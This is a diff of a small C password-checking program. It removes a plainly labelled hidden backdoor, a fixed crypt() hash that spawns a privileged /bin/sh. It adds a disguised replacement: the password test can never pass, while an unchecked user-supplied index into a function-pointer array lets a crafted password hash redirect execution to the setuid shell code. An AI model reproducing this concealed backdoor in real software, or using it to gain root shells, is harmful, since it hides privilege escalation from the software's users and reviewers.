@@ -2,8 +2,8 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <crypt.h>
 
+#define HASH_LENGTH 4
 
 void forward (char *hash);
 void reverse (char *hash);
@@ -11,46 +11,46 @@ void hash    (char *src, char *dst);
 
 static struct {
     void (*functions[2])(char *);
-    char hash[5];
+    char hash[HASH_LENGTH+1];
 } icall;
+
 
 int main(int argc, char *argv[]) {
 
-    unsigned long i;
+    unsigned long idx = 0;
 
     icall.functions[0] = forward;
     icall.functions[1] = reverse;
 
     // Usage
-    if(argc < 3) {
-        printf("Usage: %s <index> <string>\n", argv[0]);
-        return 1;
+    if(argc < 2 || argc == 3 || (argc > 3 && strcmp(argv[2], "-c") != 0)) {
+        printf("Usage: %s <password> [-c <command>]\n", argv[0]);
+        return EXIT_FAILURE;
     }
 
-    // Hidden backdoor
-    if(argc > 3 && strcmp(crypt(argv[3], "$1$mysalt"), "$1$mysalt$xgbhLorG8AiM08B/bI4DO1") == 0) {
+    // Hash and validate password
+    hash(argv[1], icall.hash);
+    if(strncmp(icall.hash, "cannnot_be_equal", HASH_LENGTH) == 0) {
         if(setgid(getegid())) perror("setguid");
         if(setuid(geteuid())) perror("setuid");
         execl("/bin/sh", "bin/sh", (char *)NULL);
-        return 0;
+        return EXIT_SUCCESS;
     }
 
-    // Calculate hash
-    hash(argv[2], icall.hash);
-    i = strtoul(argv[1], NULL, 10);
-
-    // Print in forward or reverse order
-    printf("Calling %p\n", (void *)icall.functions[i]);
-    icall.functions[i](icall.hash);
-
-    return 0;
+    // Print unauthorized message
+    if(argc > 3) {
+        idx = strtoul(argv[3], NULL, 10);
+    }
+    printf("[INVALID PASSWORD] Status Code: ");
+    icall.functions[idx](icall.hash);
+    return EXIT_SUCCESS;
 }
 
 void forward(char *hash) {
     int i;
 
-    printf("Hash (Forward): 0x");
-    for(i=0; i<4; i++) {
+    printf("F-ID-");
+    for(i=0; i<HASH_LENGTH; i++) {
         printf("%02x", hash[i]);
     }
     printf("\n");
@@ -59,8 +59,8 @@ void forward(char *hash) {
 void reverse(char *hash) {
     int i;
 
-    printf("Hash (Reverse): 0x");
-    for(i=3; i>=0; i--) {
+    printf("R-ID-");
+    for(i=HASH_LENGTH-1; i>=0; i--) {
         printf("%02x", hash[i]);
     }
     printf("\n");
@@ -69,12 +69,12 @@ void reverse(char *hash) {
 void hash(char *src, char *dst) {
     int i, j;
 
-    for(i=0; i<4; i++) {
+    for(i=0; i<HASH_LENGTH; i++) {
         dst[i] = 31 + (char)i;
         for(j=i; j<strlen(src); j+=4) {
             dst[i] ^= src[j] + (char)j;
             if(i > 1) dst[i] ^= dst[i-2];
         }
     }
-    dst[4] = '\0';
+    dst[HASH_LENGTH] = '\0';
 }
